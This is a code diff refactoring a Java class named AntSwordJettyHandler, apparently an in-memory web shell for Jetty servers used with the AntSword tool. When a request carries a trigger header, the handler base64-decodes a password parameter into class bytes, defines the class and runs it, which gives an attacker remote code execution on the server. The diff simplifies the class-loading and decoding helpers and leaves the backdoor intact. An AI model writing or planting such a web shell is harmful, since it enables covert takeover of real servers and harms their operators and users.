@@ -43,7 +43,7 @@ public class AntSwordJettyHandler extends ClassLoader {
             if (value != null && value.contains(headerValue)) {
                 String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                 byte[] bytes = base64Decode(parameter);
-                Object instance = (new AntSwordJettyHandler(Thread.currentThread().getContextClassLoader())).g(bytes).newInstance();
+                Object instance = (new AntSwordJettyHandler(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                 instance.equals(new Object[]{request, response});
                 if (baseRequest != null) {
                     baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
@@ -57,23 +57,13 @@ public class AntSwordJettyHandler extends ClassLoader {
     }
 
     @SuppressWarnings("all")
-    public Class<?> g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
-    }
-
-    @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) throws Exception {
-        byte[] value = null;
-        Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            base64 = Class.forName("sun.misc.BASE64Decoder");
-            Object decoder = base64.newInstance();
-            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
-        return value;
     }
 }
